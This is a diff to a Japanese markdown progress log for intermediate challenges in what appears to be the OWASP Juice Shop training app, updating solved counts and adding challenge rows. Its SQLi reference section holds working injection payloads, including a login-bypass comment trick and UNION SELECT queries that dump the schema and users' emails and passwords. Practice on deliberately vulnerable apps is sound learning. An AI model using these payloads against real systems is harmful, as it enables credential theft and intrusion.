@@ -1,4 +1,4 @@
-# 難易度3 チャレンジ (20/44 解決)
+# 難易度3 チャレンジ (24/24 解決)
 
 中級レベル: SQLインジェクションの応用、XXE、HTTP Parameter Pollution などを学びます。
 
@@ -6,8 +6,8 @@
 
 | 状態 | 数 |
 |------|-----|
-| ✅ 解決済み | 20 |
-| ❌ 未解決 | 24 |
+| ✅ 解決済み | 24 |
+| ❌ 未解決 | 0 |
 
 ## チャレンジ一覧
 
@@ -32,6 +32,11 @@
 | Upload Size | 入力検証 | ✅ | [upload-size.md](upload-size.md) |
 | Upload Type | 入力検証 | ✅ | [upload-type.md](upload-type.md) |
 | Security Advisory | 情報漏洩 | ✅ | [security-advisory.md](security-advisory.md) |
+| Deluxe Fraud | 入力検証 | ✅ | [deluxe-fraud.md](deluxe-fraud.md) |
+| Privacy Policy Inspection | 隠蔽 | ✅ | - |
+| Ghost Login | SQLi | ✅ | [ghost-login.md](ghost-login.md) |
+| CSRF | アクセス制御 | ✅ | [csrf.md](csrf.md) |
+| Mint the Honey Pot | Web3 | ✅ | [mint-the-honey-pot.md](mint-the-honey-pot.md) |
 
 ## SQLi リファレンス
 
@@ -42,3 +47,10 @@ jim@juice-sh.op'--              -- 特定ユーザー
 ')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
 ')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
 ```
+
+## 環境依存チャレンジ
+
+| チャレンジ | 必要条件 |
+|-----------|---------|
+| CSRF | SameSite Cookie 無効化 (古いブラウザ) |
+| Mint the Honey Pot | MetaMask + Sepolia テストネット |
